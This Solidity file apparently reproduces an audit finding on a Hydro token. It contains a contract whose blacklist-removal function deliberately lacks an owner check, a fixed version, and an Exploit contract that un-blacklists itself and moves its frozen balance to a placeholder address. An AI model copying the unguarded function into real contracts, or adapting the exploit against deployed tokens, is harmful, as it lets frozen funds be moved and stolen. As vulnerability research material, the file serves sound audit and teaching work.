// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Hydro token.move remove_addr_from_blacklist — the function takes the current
    DenyList and an address and deletes it, with no owner check (Zokyo, Hydro,
    April 2024). A blacklisted balance can then move. run() does not warp. */

contract HydroToken {
    string public name = "Hydro";
    string public symbol = "HYDRO";
    uint8 public decimals = 18;
    address public owner;
    mapping(address => bool) public denylist;
    mapping(address => uint256) public balanceOf;

    constructor() {
        owner = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == owner, "owner");
        balanceOf[to] += amount;
    }

    function blacklist(address who) external {
        require(msg.sender == owner, "owner");
        denylist[who] = true;
    }

    function removeAddrFromBlacklist(address[] calldata listed, address who) external virtual {
        bool found;
        for (uint256 i; i < listed.length; ++i) {
            if (listed[i] == who) found = true;
        }
        require(found, "listed");
        // @> VULN: the DenyList is updated with no owner == msg.sender check
        denylist[who] = false;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(!denylist[msg.sender], "denied");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract HydroTokenFixed is HydroToken {
    function removeAddrFromBlacklist(address[] calldata listed, address who) external override {
        require(msg.sender == owner, "owner");
        bool found;
        for (uint256 i; i < listed.length; ++i) {
            if (listed[i] == who) found = true;
        }
        require(found, "listed");
        denylist[who] = false;
    }
}

contract Exploit {
    address public constant RECEIVER = 0x2222222222222222222222222222222222222222;
    uint256 public constant FROZEN = 1000 ether;

    HydroToken public token;
    bool public listedBefore;
    bool public listedAfter;
    uint256 public moved;

    constructor() {
        token = new HydroToken();
        token.mint(address(this), FROZEN);
        token.blacklist(address(this));
    }

    function run() external {
        listedBefore = token.denylist(address(this));
        address[] memory listed = new address[](1);
        listed[0] = address(this);
        token.removeAddrFromBlacklist(listed, address(this));
        listedAfter = token.denylist(address(this));
        require(token.transfer(RECEIVER, FROZEN), "move");
        moved = token.balanceOf(RECEIVER);
        require(listedBefore == true, "before");
        require(listedAfter == false, "after");
        require(moved == FROZEN, "moved");
        require(token.balanceOf(address(this)) == 0, "left");
    }
}
